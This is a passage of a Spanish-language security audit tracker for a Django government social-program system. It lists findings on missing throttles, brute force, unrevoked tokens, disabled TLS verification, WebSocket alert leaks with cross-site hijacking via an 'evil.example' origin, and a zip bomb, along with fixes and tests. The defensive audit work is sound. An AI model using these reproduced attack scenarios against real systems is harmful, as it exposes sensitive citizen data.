2. *Sin caché.* La ficha dice «(cacheado)». Una caché compartida entre `personas/consultar/` y el alta
   cambiaría también el comportamiento del link público (las dos pasan por `identificar`) y haría no
   determinista el presupuesto de consultas; el costo real es **una** consulta a la Gran Base por alta
   con origen `personas`, después del commit y fuera del `select_for_update` (Cambio 91), con el
   cortacircuito de SIIS-09 delante. La cadena nueva quedó declarada en `core/integraciones.CADENAS`
   como `"app de campo · alta de un caso"` (30 s < 55, `core.E003`). Si el volumen lo pide, la caché
   es una mejora posterior, no un prerrequisito.
**Test permanente:** `programas.tests.test_becas_api.IdentidadNoLaAcreditaElClienteTests` (8 tests,
incluidos `test_el_documento_que_no_figura_queda_escrito_en_la_carga`,
`test_la_fuente_que_no_respondio_queda_escrita_en_la_carga` y
`test_la_carga_acreditada_no_lleva_ninguna_de_las_dos_lineas`) y
`programas.tests.test_padron_identidad.OrigenPadronServidorTests.test_personas_sin_respaldo_queda_manual`
(+ `test_personas_con_respaldo_toma_los_datos_de_la_fuente`,
`test_personas_respaldado_por_el_padron_vale_como_padron`). El test que fijaba el comportamiento viejo
(`test_crear_formulario_validado_por_personas_queda_validado`) quedó invertido: sigue validando, pero
ahora exige que el servidor haya consultado (`mock_consultar.assert_called_once_with`).

### SEC-25 · `consultar_persona_becas` sin throttle (enumeración contra la Gran Base)
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-25 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-25

**⚠ Actualizar (03-oct-2026):** la tasa `DEFAULT_THROTTLE_RATES["renaper"]` quedó sin consumidor al borrar `RenaperRateThrottle` (SEC-04, #509): usarla acá o borrarla (R0-05).
- **Ubicación:** `programas/api/views.py:212-250` (sin `throttle_classes`; devuelve nombre, apellido y nacimiento de cualquier DNI y sexo).
- **Propuesta:** `@throttle_classes([ScopedRateThrottle])` con `throttle_scope = "personas_campo"` y en settings `"personas_campo": "120/hour"` (default D-25; por usuario porque el request está autenticado). Aplica también al alias `/api/becas/renaper/consultar/`.
- **Tests a agregar:** N+1 consultas → 429.
- **Verificación:** V-STD.

**Resolución:** ✅ Resuelta en #638 (Cambio 184), 08-10-2026 — `consultar_persona_becas` lleva
`@throttle_classes([ConsultaPersonasThrottle])` y la tasa `"personas_campo": "120/hour"` (default
D-25). **Desvío de la ficha:** se usa un `UserRateThrottle` con `scope` propio en vez de
`ScopedRateThrottle`, porque el `throttle_scope` de un `ScopedRateThrottle` no se puede declarar sobre
una vista de función sin subclasear igual, y `UserRateThrottle` ya toma `request.user.pk` como
identidad, que es lo que D-25 pide (por usuario, no por IP: los territoriales salen por el NAT de la
operadora móvil). No se toca `NUM_PROXIES`. El alias `renaper/consultar/` comparte la cubeta porque es
la misma vista. El 429 no rompe la app instalada: `RelevamientoDetailScreen` atrapa el error de la
consulta y cae a carga manual, y esa llamada no pasa por la cola de sincronización, así que no hay
`FAILED_PERMANENT` posible.
**Test permanente:** `programas.tests.test_becas_api.ConsultaDePersonasConThrottleTests` (5 tests).

**R0-05 ✅ en el mismo Cambio:** la tasa `"renaper": "30/min"` se borró y su lugar lo ocupa
`"personas_campo"`. El `DEFAULT_THROTTLE_RATES` vuelve a tener exactamente un consumidor por entrada;
lo fija `ConsultaDePersonasConThrottleTests.test_la_tasa_configurada_es_la_de_d25`.

### SEC-26 · Login, `/admin/`, recupero, clave provisoria y token de campo sin límite, validadores ni rotación
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura; token y clave provisoria con test `poc/test_repro_usuarios.py::G1b03y04TokenCampoTests`) · **Origen:** A5-15, A5-35, A5-37, G1b-03, G1b-04 · **Ola:** 2 · **Esfuerzo:** M · **Decisión:** D-26 (clave provisoria del territorial)
- **Ubicación:** `users/views/auth.py:13-38` y `users/forms/auth.py:29-41` (sin throttle); `config/urls.py:26` (`admin/`) y `:36-37` (`django.contrib.auth.urls` en la raíz); `programas/api/views.py:89-102` (`ObtainCampoToken`: `Token.get_or_create`, sin vencimiento, no mira `debe_cambiar_contrasena`); `users/middleware.py:46-48` (la clave provisoria no aplica en `/api/`); `users/api_views/__init__.py:73-90` y `users/serializers/__init__.py:105-115` (`change_password` sin `validate_password`); `users/services/correo.py:79-83`, `users/views/auth.py:57` (solo ahí se limpia el flag).
- **Escenario:** fuerza bruta distribuida contra `/`, `/admin/login/`, `/api/becas/auth/token/`; un token filtrado del teléfono sirve indefinidamente (reproducido: el token viejo da 200 en `/api/becas/relevamientos/` después de `set_password`; ningún `Token…delete()` en el repo); un territorial (`territorial_mobile_only`) es rechazado por el login web pero `/api/becas/auth/token/` le da 200 con la clave provisoria y `debe_cambiar_contrasena` queda en True para siempre; además el correo `users/templates/user/email/credenciales_usuario.txt` le promete «el sistema te va a pedir que cambies la contraseña en tu primer ingreso», que para él es falso (contradice el Cambio 37).
- **Propuesta:**
  1. `UsuariosAuthenticationForm.clean`: `if rate_limit_excedido(self.request, "login", 10, 600) or rate_limit_excedido(self.request, "login_user", 10, 600, sufijo=username.lower(), incluir_ip=False): raise ValidationError(...)`. Lo mismo en una subclase propia de `PasswordResetView`.
  2. Borrar el include de `django.contrib.auth.urls` (`config/urls.py:36-37`): no hay referencias a sus nombres; `users.urls` y portal definen `success_url` propios. Ojo con G2-03: el cambio voluntario de clave necesita un flujo propio con clave actual.
  3. Token de campo: signal `post_save` de `User` (o llamada explícita en `_apply_user_data`, `entregar_credenciales_provisorias`, `CambioContrasenaObligatorioView` y el reset) que, si cambió el hash, haga `Token.objects.filter(user=user).delete()`; `ScopedRateThrottle` en `ObtainCampoToken`.
  4. Clave provisoria del territorial (D-26): (a) `ObtainCampoToken` responde 403 `code=debe_cambiar_contrasena` + endpoint API para fijar clave (requiere release de la app), o (b) para usuarios solo-campo, mandar un link de reseteo en vez de la clave en texto plano. En ambos casos, `PasswordResetConfirmView` propio que limpie el flag, y corregir el texto del correo. Default: (b), sin release de la app.
  5. `change_password` por API: desaparece si se apaga la API (SEC-05); si no, `validate_password`, `update_session_auth_hash`, borrar el Token y throttle.
  6. Restringir `/admin/` por IP en nginx/ingress (ver también G1c-10).
- **Tests a agregar:** N intentos → bloqueo; `test_token_viejo_401_tras_cambio_de_clave` (el de la PoC invertido); `test_territorial_con_provisoria_no_obtiene_token` o `test_correo_territorial_lleva_link_de_reset` según D-26; `resolve("/password_reset/")` → 404.
- **Verificación:** V-STD + `manage.py test users programas.tests.test_becas_api`.
- **Dependencias:** SEC-05, G2-03, G1b-08.

**Resolución:** 🟡 Resuelta **la parte de código** en #631 (Cambio 181, Ola 2 PR 2), 08-10-2026.
Quedan abiertos el punto 6, que es de infraestructura, y **la revocación automática del token al
cambiar la clave, que espera un release de `Chaco-mobile` que reintente o re-loguee ante un 401**
(ver el punto 3: hoy la revocación es una acción explícita del ABM). Punto por punto:

1. **Límite de intentos.** `UsuariosAuthenticationForm` y una `RecuperarContrasenaView` propia usan
   `core.services.throttle`. **Desvío de la ficha:** solo cuentan los intentos **fallidos**, para lo
   cual se agregó `rate_limit_bloqueado`, la mitad de solo lectura del helper (preguntar sin gastar
   ficha). Con la receta literal, una repartición que sale por una IP única se quemaba la cuota con
   el tráfico normal de la mañana. Recupero: 5/h por correo y 20/h por IP, y al pasarse **no manda
   el correo pero devuelve la misma pantalla**, para no revelar nada.

   **Corregido en la ronda 2 de la revisión** —la primera versión abría dos agujeros propios—:

   * *Bloqueo de cuenta por tercero.* La cubeta por usuario no mira la IP (si no, rotar de proxy
     devolvía la cuota) y se consultaba **antes** de autenticar: diez POST con el usuario de otra
     persona la dejaban diez minutos afuera, y repitiéndolos, afuera indefinidamente. Ahora se
     consulta **después**, y solo si la credencial estaba mal: el dueño con su clave correcta entra
     siempre, esté la cubeta como esté. Vale para el login web y para `/api/becas/auth/token/`.

     **Lo que esa cubeta es y lo que no.** Como se consulta después de autenticar y no interrumpe
     nada, pasados los 10 fallos lo único que cambia es **el mensaje** («Demasiados intentos
     fallidos…» en vez de «Credenciales inválidas»): el intento 11 contra esa cuenta se verifica
     igual que el 1. No es, entonces, un límite por cuenta —no lo puede ser sin reabrir el bloqueo
     por tercero—, y no hay que leerla como tal. **El techo real del adivinado online es la cubeta
     por IP**, que sí rechaza antes de mirar la clave: 300 fallidos cada 10 minutos
     (`AUTH_FALLIDOS_MAX_POR_IP`) para las dos puertas juntas. La de usuario queda como señal de
     que esa cuenta está siendo barrida —hoy visible solo en el mensaje y en los logs—.
   * *Techo por IP.* `/api/becas/auth/token/` no tenía ninguno y el del login web (30/10 min) se
     fue con él: ahora hay **una sola cubeta por IP compartida por las dos puertas**,
     `AUTH_FALLIDOS_MAX_POR_IP` (300 fallidos cada 10 min, por setting). Es holgada a propósito —el
     argumento del NAT móvil se respeta con el número, no dejando la puerta sin techo— y es la
     **única** que rechaza antes de verificar la clave, cosa que puede hacer porque la paga la IP
     que ataca y no la cuenta atacada. Es lo que corta el password-spray, que la cubeta por usuario
     no ve porque cambia de usuario en cada intento. La IP sale de `ip_cliente`, que lee
     `X-Forwarded-For` solo si el salto anterior está en `TRUSTED_PROXY_NETS`.
   * Y el usuario tipeado se recorta a 150 (el largo de `auth_user.username`) **antes** de armar la
     clave de la caché: un POST con 400 caracteres escribía una clave de 400 caracteres en Redis por
     intento.
2. **`django.contrib.auth.urls` fuera de la raíz.** Con él se va `/password_change/`, que sin
   plantilla moría en el GET pero en el POST cambiaba la clave y redirigía —sin pedir la actual y
   sin límite—. El reemplazo con clave actual es `users:cambiar_contrasena` (G2-03), con su pantalla
   y su link en el menú del avatar, que es la primera entrada que ese flujo tiene en el producto.
3. **Token de campo — la revocación es explícita, no automática.** La primera versión colgaba el
   borrado de un `post_save(User)`: cambiar la clave por cualquiera de los cuatro caminos borraba el
   token. **Se dio marcha atrás en la ronda 2**, y el motivo está en la app instalada: ante un 401,
   `Chaco-mobile @ a66c2d3` marca la operación `FAILED_PERMANENT` (`relevamientoService.js:1487`) y
   `:1411`/`:1563` no la vuelven a tomar **nunca**, ni después de re-loguearse. Un territorial al que
   le resetean la clave perdía, en silencio, todo lo que el teléfono todavía no había sincronizado.
   Así que **cambiar la clave ya no toca el token** —las sesiones web se cierran como siempre— y
   quien se quedó con el token viejo sigue pudiendo sincronizar lo que tenía pendiente.

   En su lugar hay una acción explícita en el ABM de Usuarios, **«Cerrar sesión de la app»**
   (`users/views/admin.py::UserCerrarSesionAppView` + `users/services/credenciales.py`), para cuando
   el teléfono se perdió o la clave se filtró: ahí perder lo no sincronizado es el mal menor y quien
   aprieta el botón lo decide avisado. POST con CSRF, confirmación con el modal estándar (SweetAlert2,
   nunca `confirm()`) que dice textualmente que «los relevamientos que el teléfono no haya
   sincronizado van a quedar trabados en la app», resultado por toast, y el mismo alcance que editarle
   las credenciales a ese usuario (`puede_gestionar_credenciales`, el de R0b-02/R0b-10): fuera de
   alcance contesta **403**. El botón se dibuja solo sobre quien de verdad tiene un token, con una
   consulta por página sumada a la anotación en lote de R0b-10.

   **Queda abierto:** la revocación automática al cambiar la clave espera un release de
   `Chaco-mobile` que reintente o re-loguee ante un 401.
4. **Clave provisoria del territorial — D-26 = (b), el default.** `entregar_credenciales_provisorias`
   le manda un **link de reseteo** a quien solo tiene `becas.campo` (`rbac.es_solo_campo`, extraída
   del propio login, que ya hacía esa pregunta), y una clave aleatoria larga que no conoce nadie
   queda en la fila para que «Olvidé mi contraseña» siga funcionando si el link vence.
   `EstablecerContrasenaView` limpia `debe_cambiar_contrasena`, y el correo dejó de prometerle al
   territorial algo que para él era falso. **La app instalada no se toca:** `Chaco-mobile @ a66c2d3`
   ya linkea `/recuperar-contrasena/` desde «Olvidé mi contraseña» y el contrato de
   `/api/becas/auth/token/` (`{username, password}` → `{token, user_id, username}`) queda igual.
5. **`change_password` por API:** ya no existe. Lo retiró SEC-05/D-05 (Cambio 100): `users/api_views`
   quedó con `UsuarioActualView` de solo lectura. Nada que hacer.
6. **`/admin/` por IP: sigue abierto.** Es nginx/ingress de ECOM, no código; va con G1c-10 (PR 8 de
   esta ola) y con el PM.

**Test permanente:** `users.tests.test_credenciales_ola2_pr2.CerrarSesionDeLaAppTests.test_la_accion_explicita_si_borra_el_token`
(+ `test_un_admin_de_otro_programa_recibe_403_y_el_token_sigue_vivo`, `test_sin_capacidad_y_anonimo_no_cierran_nada`,
`test_no_se_cierra_por_GET`, `test_el_boton_aparece_solo_sobre_quien_tiene_sesion_en_la_app`,
`test_el_aviso_del_modal_dice_que_se_pierde_lo_no_sincronizado`;
`TokenDeCampoYClaveDelTerritorialTests.test_cambiar_la_clave_no_cierra_la_sesion_de_la_app` —la contracara, con la app
sincronizando con el token viejo—, `test_la_app_instalada_sigue_entrando_con_la_clave_nueva`,
`test_el_login_de_la_app_frena_tras_diez_intentos_fallidos`, `test_la_cubeta_del_token_no_deja_afuera_al_dueno_de_la_cuenta`,
`test_la_cubeta_del_token_no_mira_la_ip`, `test_un_username_gigante_no_arma_una_clave_de_cache_gigante`,
`test_el_alta_del_territorial_manda_un_link_y_no_una_clave_en_claro`,
`test_el_alta_de_un_usuario_de_backoffice_sigue_llevando_la_clave`, `test_el_link_limpia_la_marca_de_clave_provisoria`,
`test_el_alta_rapida_de_un_territorial_avisa_que_mando_el_link`; `TechoPorIpTests` ×3,
`LimiteDeIntentosTests` ×5 —incluido `test_la_cubeta_por_usuario_no_deja_afuera_al_dueno_de_la_cuenta`— y
`SinRutasDeAuthDeDjangoTests` ×2).

**Hallazgo lateral que destapó el punto 2.** Sacar `django.contrib.auth.urls` sacó también su
`/logout/`, y con eso se descubrió que el barrido de RED-89
(`core/tests/test_superficie_publica.py::SuperficieSinRolTests`) **se deslogueaba a sí mismo**: el
recorrido reintenta con POST toda vista que conteste 405, el logout es una de ellas, y como las rutas
van ordenadas por nombre, todo lo que caía después se medía contra un anónimo —que rebota siempre— y
el test daba verde sin preguntar nada. El barrido ahora rehace la sesión antes de cada ruta.
Aparecieron **siete rutas que contestaban 200 desde siempre**: cuatro catálogos de `/api/core/`
(meses, provincias, municipios, sexos), de la misma familia que los dos que ya estaban en la
allowlist, y las **tres pantallas de documentación de la API** (`/api/schema/`, `/api/docs/`,
`/api/redoc/`), que la decisión del 26/08/2026 puso detrás de **login**, no detrás de capacidad. Las
ocho entraron a la allowlist con su motivo; que la documentación de la API la vea un usuario de
backoffice sin un solo rol es una decisión de producto que **nadie tomó explícitamente** y que
conviene revisar fuera de esta ficha.

### SEC-27 · RENAPER con `verify=False` y las advertencias TLS apagadas para todo el proceso
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A2-10 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-27 (ECOM confirma la cadena)

**Resolución:** 🟡 Preparado y apagado en #640 (Cambio 185, Ola 2 PR 8), 08-oct-2026, con el
default de **D-27** — el `verify=False` escrito en el código se fue: lo decide
`legajos.services.consulta_renaper.verificacion_tls()` a partir de `RENAPER_CA_BUNDLE` (ruta a un .pem
de una CA privada, implica verificar) y `RENAPER_VERIFY_TLS`. **El default es el comportamiento de hoy**
—`False`—, porque encenderlo sin la cadena confirmada **corta el alta de ciudadanos en el acto**. Lo que
sí cambió ya: el `urllib3.disable_warnings(InsecureRequestWarning)` del import, que silenciaba el aviso
de **todo el proceso** (también el de SIIS, Personas y reCAPTCHA, que sí verifican). Queda para el PM:
pedirle a ECOM la cadena del organismo, cargarla y encender la variable ambiente por ambiente, con
`manage.py diagnosticar_integraciones` antes de PRD. **Nada se probó contra RENAPER real.**
**Test permanente:** `legajos.tests.test_renaper_tls_y_payload.VerificacionTlsTests` y
`.VerifyLlegaAlPedidoTests` (el kwarg que de verdad sale por la red, en GET y en POST) y
`.AvisoTlsTests.test_el_modulo_no_apaga_el_aviso_de_tls_del_proceso`.
- **Ubicación:** `legajos/services/consulta_renaper.py:19-20` (`urllib3.disable_warnings(InsecureRequestWarning)` al importar: silencia también SIIS, Personas y reCAPTCHA), `:268` y `:278` (`verify=False`).
- **Propuesta:** `verify=getattr(settings, "RENAPER_CA_BUNDLE", "") or True` y borrar el `disable_warnings`. Variable nueva `RENAPER_CA_BUNDLE` en settings y en la plantilla de entornos. Riesgo: si RENAPER usa una CA privada, se corta hasta cargar el bundle: validar con `diagnosticar_integraciones` en cada ambiente antes de desplegar.
- **Tests a agregar:** mock de `session.post` que afirme `kwargs["verify"] is not False` con la configuración por defecto.
- **Verificación:** V-STD + `manage.py diagnosticar_integraciones` en DEV/QA.

### G1c-04 · `/ws/alertas/` difunde fuera de alcance, no revalida la sesión ni la capacidad y no chequea el origen
**Severidad:** MEDIA · **Estado:** CONFIRMADO con test (`poc/test_repro_admin_cron_renaper.py::G1c04WsAlertasTests`) · **Origen:** G1c-04 (verificado en G3) · **Ola:** 2 · **Esfuerzo:** M · **Decisión:** —
- **Ubicación:** `conversaciones/consumers.py:212-251` (solo `rbac.puede("ciudadano.ver")` + `group_add("alertas_sistema")`); `legajos/services/alertas.py:165-190` (`group_send` con nombre y mensaje); `config/asgi.py:16-21` (sin `AllowedHostsOriginValidator`).
- **Escenario (reproducido):** (a) un usuario con solo `ciudadano.ver` recibe por WS una alerta que por HTTP no ve (`RIESGO_SUICIDA`, `VIOLENCIA`, `EVENTO_CRITICO`; el «Operador de backoffice» tiene `ciudadano.ver` sin `ciudadano.sensible`), también como notificación del sistema operativo (`alertas_websocket.js:70-75`); (b) después de quitarle el rol, el socket abierto sigue recibiendo; (c) con la sesión reemplazada (HTTP → 302 al login), el WS conecta igual; (d) conecta con `Origin: https://evil.example` (CSWSH desde un sitio hermano de `*.chaco.gob.ar` / `*.ecomdev.ar`, cookie `Lax`: PLAUSIBLE). Agravante: cada pasada horaria de `generar_alertas` recrea y redifunde (LEG-01).
- **Propuesta:** (1) `config/asgi.py`: `"websocket": AllowedHostsOriginValidator(AuthMiddlewareStack(URLRouter(...)))` (cierra también el CSWSH de los consumers de conversaciones); (2) `AlertasConsumer.connect`: exigir `ciudadano.sensible` (misma regla que SEC-11) y rechazar si `profile.backoffice_session_key != scope["session"].session_key` o si `debe_cambiar_contrasena`; (3) en `nueva_alerta`, filtrar por alcance con `await database_sync_to_async(FiltrosUsuarioService.obtener_alertas_usuario(user).filter(pk=id).exists)()` y revalidar `rbac.puede` cada N minutos (cerrar con 4403); alternativa más barata: un grupo por usuario y que el emisor mande solo a los usuarios con alcance.
- **Tests a agregar:** el de la PoC invertido con `WebsocketCommunicator`: Origin ajeno → `connect` False; sin alcance → `receive_nothing()` True; sesión reemplazada → False.
- **Verificación:** V-STD + `manage.py test conversaciones legajos`.
- **Dependencias:** SEC-18, SEC-11; G1c-17 y G3-03 en el mismo PR.

**Resolución:** ✅ Resuelto en #629 (Cambio 179), 08-oct-2026 - las cuatro caras: (d) `config/asgi.py`
envuelve el router en `AllowedHostsOriginValidator`, que cierra el CSWSH **de los cuatro consumers**, no solo
del de alertas; (1) `AlertasConsumer` pide `ciudadano.sensible` (D-11, misma capacidad que SEC-11); (c) rechaza
si `Profile.backoffice_session_key` no es la sesión del handshake o si `debe_cambiar_contrasena` -los dos
chequeos que hacen los middlewares del HTTP y que el WS no atraviesa-; (a) y (b) el filtro por alcance va en el
envío: `nueva_alerta` y `alerta_cerrada` pasan por `_entregar`, que compara la alerta contra el alcance del socket
y, si el usuario perdió capacidad, alta o sesión, cierra con **4403** -así un socket abierto deja de recibir cuando
le quitan el rol-. **Hallazgo extra, fuera de la ficha:** `legajos/services/alertas.py` mandaba `legajo_id` como
`UUID`, que `json.dumps` no serializa, asi que la difusión **siempre** moría -en el log del consumer- justo para
las alertas que cuelgan de un legajo, que son las únicas con alcance; va como `str()`.

**Corrección de la ronda 2 del PR (performance): el alcance se resuelve por ventana, no por entrega.** La primera
vuelta revalidaba y resolvía el alcance en **cada** entrega con
`FiltrosUsuarioService.obtener_alertas_usuario(user).filter(pk=...).exists()`: **5 consultas por alerta y por
socket**, con tres `IN` anidados sobre las 40k inscripciones. Como la pasada horaria de `generar_alertas` recrea y
redifunde de golpe (LEG-01), eso es 5·N·M contra el `read_timeout` de 10 s de ECOM. Ahora: (i) el **emisor**
calcula una vez por alerta los datos de ruteo -`responsable_id` del legajo y sus `programa_ids`
(`AlertasService._ruteo_de`)-, que viajan en el evento **aparte del payload** y nunca llegan al navegador; (ii) el
**consumer** resuelve el alcance del usuario una vez por ventana (`AlertasConsumer.VENTANA_REVALIDACION`, 60 s,
sobreescribible con `ALERTAS_WS_VENTANA_REVALIDACION`) y lo guarda en el socket: global, `user_pk`, `programas` y
si tiene legajos propios; (iii) cada entrega decide en memoria, **sin tocar la base**, con la misma regla que
`FiltrosUsuarioService`. Al vencer la ventana se revalida todo y, si lo perdió, 4403. **La ventana de 60 s es la
latencia máxima declarada** entre quitarle la capacidad o la sesión a alguien y que deje de recibir.
**Test permanente:** `conversaciones.tests.test_ws_alertas_rbac.WsAlertasRbacTests` (la PoC `G1c04WsAlertasTests`
invertida: `test_origin_ajeno_no_conecta`, `test_sesion_reemplazada_no_conecta`,
`test_no_entrega_una_alerta_fuera_del_alcance`, `test_quitarle_el_rol_corta_el_socket_abierto`,
`test_reemplazarle_la_sesion_corta_el_socket_abierto` y `test_el_ruteo_no_viaja_al_cliente`) y
`VentanaDeRevalidacionTests` (N entregas dentro de la ventana ≤ 2 consultas, con `CaptureQueriesContext`).

**Corrección de la ronda 3 del PR: el logout no cortaba el socket.** `_sesion_vigente` comparaba la clave del
handshake contra `Profile.backoffice_session_key`, y `logout()` **no toca esa columna**: borra la fila de la
sesión y deja la clave vieja escrita, así que la comparación daba `True` para siempre. Quien cerraba sesión
seguía recibiendo alertas por el socket abierto -con el texto sensible y como notificación del sistema
operativo- hasta que la pestaña se cerrara. La revalidación por ventana confirma ahora, además, que la sesión del
handshake **siga existiendo** (`scope["session"].exists(clave)`, por el backend configurado: `db` en dev y QA,
`cache` en prd); si no está, 4403. Va en la revalidación, no en cada entrega: es una consulta por ventana.
**Test permanente:** `WsAlertasRbacTests.test_el_logout_corta_el_socket_abierto` (con
`ALERTAS_WS_VENTANA_REVALIDACION=0`, que es el peor caso de latencia).

## BAJA

### SEC-30 · Requisitos, subsegmentos y coordinadores validados solo contra el segmento (Coordinador Regional, latente)
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura); explotable solo si al Regional le tildan `becas.requisito.*` o `subsegmento.crear` · **Origen:** A5-26 · **Ola:** 2 · **Esfuerzo:** S

**Resolución:** ✅ Resuelto en #626 (Cambio 177, Ola 2 PR 5), 08-oct-2026 — `puede_configurar_segmento` separa «operar dentro del segmento» de «configurarlo», y el guard de la vista (renombrado a `_assert_scope_segmento`, RED-79) lo usa. Con eso el Coordinador Regional queda afuera de las **cinco** puertas de nivel de segmento de una sola vez —activar/desactivar, alta de subsegmento, asignar y desasignar coordinador, requisito del segmento— en vez de parchear cada una. Lo que sí es suyo sigue abierto: `_assert_scope_requisito` mira el **subsegmento** cuando el requisito tiene uno, y `requisito_crear` con `?subsegmento=` también. **Test permanente:** `programas.tests.test_coordinador_regional.ConfiguracionDelSegmentoTests` (requisito del par → 403, requisito del segmento → 403, subsegmento nuevo → 403, el propio sigue borrándose y el admin del programa sigue configurando).
- **Ubicación:** `programas/views/configuracion.py:465-467`, `:581-606`, `:641-645`, `:671-677`; `programas/services/autorizacion.py:229-243`.
- **Propuesta:** `_assert_scope_subsegmento` cuando hay subsegmento; si es a nivel segmento y el usuario es Regional → 403.
- **Test:** Regional + `requisito.editar` → 403 sobre el requisito de un par.

### SEC-31 · Padrón .xlsx: límite de 2 MB solo sobre el archivo comprimido (zip bomb)
**Severidad:** BAJA · **Estado:** PLAUSIBLE · **Origen:** A5-28 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `programas/services/padron.py:158-164`, `:173`.
- **Propuesta:** sumar los `file_size` del zip antes de openpyxl (tope ~20 MB) y cortar `iter_rows` por `max_row`.
- **Test:** xlsx inflado → `ValidationError`.

### SEC-32 · Consulta RENAPER desde la admisión sin `ciudadano.*`, por GET y sin throttle
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-30 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `programas/views/admisiones.py:62-83` (`GET /dispositivos/<pk>/admisiones/nueva/?dni=…&sexo=M` como buscador RENAPER con solo `dispositivo.admitir`).
- **Propuesta:** exigir `ciudadano.crear` antes de consultar (ya se exige al crear, `:107`), throttle y registro.

**Resolución:** ✅ Resuelto en #640 (Cambio 185, Ola 2 PR 8), 08-oct-2026 — las tres cosas que pedía
la ficha: el buscador consulta RENAPER solo si el operador tiene `ciudadano.crear` (la misma capacidad
que el POST ya exigía para dar de alta: a quien no la tiene, esos datos no le servían ni para eso),
pasa por una cubeta de 60 consultas por hora **por operador** —no por IP: un dispositivo entero sale a
internet por una sola— y deja una línea en el log con el usuario y el dispositivo, **sin el documento**
(SIIS-14). Quien no puede crear sigue buscando y admitiendo a los que ya están en el padrón, que es el
camino normal y no consulta nada. **Test permanente:**
`programas.tests.test_admision_renaper.ConsultaRenaperDesdeLaAdmisionTests` (5 tests: sin la capacidad
no se consulta, con ella la pantalla no cambia, el padrón no dispara consulta, la cubeta corta y es por
operador).

### SEC-33 · El mapa del caso envía las coordenadas GPS del domicilio a OpenStreetMap
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-34 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `programas/views/revision.py:679-696` (cada apertura manda lat/lng exactas, IP y Referer).
- **Propuesta:** cargar el iframe solo con un clic («Ver en mapa») y `referrerpolicy="no-referrer"`. Es UI: V-UI.

**Resolución:** ✅ Resuelto en #640 (Cambio 185, Ola 2 PR 8), 08-oct-2026 — el `src` del iframe
viaja en `data-src` y lo pone un botón «Ver el mapa»; el iframe lleva `referrerpolicy="no-referrer"`.
Abrir un caso con GPS ya no le manda a OpenStreetMap las coordenadas exactas del domicilio junto con la
IP del backoffice y el `Referer` de la pantalla de revisión —lo hacía en **cada** apertura, lo mirara
alguien o no—. Las coordenadas se siguen mostrando como texto y el link «Abrir mapa» sigue estando: lo
que se corrió es **quién decide** que el dato salga del sistema. **Test permanente:**
`programas.tests.test_becas_revision.MapaDelCasoTests` (4: el HTML no trae el `src` que dispara el
pedido, sí el `data-src`, el iframe no manda `Referer`, y un caso sin GPS sigue diciendo que no tiene).

### SEC-34 · `EntregaMercaderiaCreateView` busca el objeto antes de autorizar
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-36 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `programas/views/merenderos.py:188-190` (un anónimo distingue ids existentes —redirect al login— de inexistentes —404—).
- **Propuesta:** hacer el lookup después de `super().dispatch`.

**Resolución:** ✅ Resuelto en #553 (Cambio 122, PR R-05), 04-oct-2026 — ya estaba arreglado cuando esta
ola llegó a la ficha: lo cerró el mismo PR en que el barrido de superficie pública (RED-02) lo encontró
por su cuenta —lo nombra como «un segundo caso del molde de RED-73»—. `EntregaMercaderiaCreateView`
resuelve el merendero en una `cached_property` que corre recién en `get_context_data`/`form_valid`, ya
con la autorización hecha, así que la ruta contesta lo mismo exista o no el id. El PR 8 de la Ola 2 lo
verificó y **no tocó código**: la ficha se cierra contra lo que ya está. **Test permanente:**
`programas.tests.test_merenderos.EntregaCreateAutorizaAntesDeBuscarTests` (anónimo → login y sin
capacidad → 403 exista o no el merendero; con capacidad, un id inexistente sigue dando 404).

### SEC-35 · Cookies seguras y HSTS dependen de `ENVIRONMENT=prd`; el timeout por inactividad es solo del cliente
**Severidad:** BAJA · **Estado:** PLAUSIBLE (depende de las variables en ECOM) · **Origen:** A5-38 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** pregunta ECOM (variables)
- **Ubicación:** `config/settings.py:23`, `:365-378`, `:604-622`. Sin `ENVIRONMENT=prd` quedan `SESSION_COOKIE_SECURE=False`, `CSRF_COOKIE_SECURE=False`, HSTS 0; `SESSION_IDLE_TIMEOUT_MINUTES` solo actúa en JS; `USE_X_FORWARDED_HOST=True` con nginx pasando el `X-Forwarded-Host` del cliente.
- **Propuesta:** `SESSION_COOKIE_SECURE = CSRF_COOKIE_SECURE = not DEBUG`; middleware de expiración por inactividad del lado del servidor (`last_activity` en sesión); `proxy_set_header X-Forwarded-Host $host;` en nginx. Ver OPS-12 (QA declara `prd`).
- **Test:** `manage.py check --deploy` con `DEBUG=False` y `ENVIRONMENT` sin setear.

**Resolución:** 🟡 Parcial en #640 (Cambio 185, Ola 2 PR 8), 08-oct-2026 — lo que no depende de
ECOM. (1) **Cookies:** `SESSION_COOKIE_SECURE = CSRF_COOKIE_SECURE = not DEBUG`. Atarlas a
`ENVIRONMENT == "prd"` las dejaba viajando en claro en cualquier ambiente servido que no declarara la
variable, y `ENVIRONMENT` es una declaración, no un hecho (icore vale `prd` siendo DEV; QA lo pisa a
`prd`, OPS-12). `DEBUG` sí es un hecho. Se ve en `check --deploy`: `security.W012` y `security.W016`
dejaron de salir. **QA no se rompe:** ya servía por HTTPS y ya tenía las cookies seguras por
`settings_production`. (2) **Inactividad del lado del servidor:**
`core.middleware.ExpiracionPorInactividadMiddleware` guarda `last_activity` en la sesión y cierra la que
pasó `SESSION_IDLE_TIMEOUT_MINUTES` sin pedir nada —el mismo número que ya usaba el JS—. Va **antes** de
`PortalCiudadanoMiddleware`, `BackofficeSingleSessionMiddleware` y `CambioContrasenaObligatorioMiddleware`:
una sesión vencida no paga el Profile ni termina en la pantalla de cambio de clave, termina en el login.
`/api/` queda exento —la app de campo autentica por Token dentro de la vista y no tiene sesión que
expirar—. **Lo que la ficha no pedía y sin lo cual el arreglo rompía trabajo real:** el contador del
